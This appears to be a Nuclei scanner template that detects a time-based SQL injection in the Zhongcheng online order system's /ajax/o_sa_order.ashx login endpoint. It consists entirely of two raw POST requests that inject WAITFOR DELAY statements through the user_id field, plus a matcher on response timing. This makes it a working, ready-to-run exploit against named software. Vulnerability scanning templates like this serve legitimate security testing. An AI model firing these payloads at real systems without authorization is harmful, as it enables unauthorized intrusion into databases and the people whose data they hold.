id: zhongcheng-o_sa_order-sqli

info:
  name: 众诚网上订单系统-SQL注入-o_sa_order
  author: HuanXiong
  severity: high

  tags: SQL Injection

http:
  - raw:
      - |
        @timeout: 30s
        POST /ajax/o_sa_order.ashx HTTP/1.1
        Host: 
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
        Accept: */*
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br, zstd
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        X-Requested-With: XMLHttpRequest
        Connection: keep-alive
        Priority: u=0
        
        type=login&user_id=1%27);WAITFOR%20DELAY%20%270:0:2%27--&user_pwd=1

      - |
        @timeout: 30s
        POST /ajax/o_sa_order.ashx HTTP/1.1
        Host: 
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
        Accept: */*
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br, zstd
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        X-Requested-With: XMLHttpRequest
        Connection: keep-alive
        Priority: u=0
        
        type=login&user_id=1%27);WAITFOR%20DELAY%20%270:0:3%27--&user_pwd=1

    matchers:
      - type: dsl
        condition: and
        dsl:
          - 'duration_1>=2 && duration_1<=3'
          - 'duration_2>=3 && duration_2<=4'

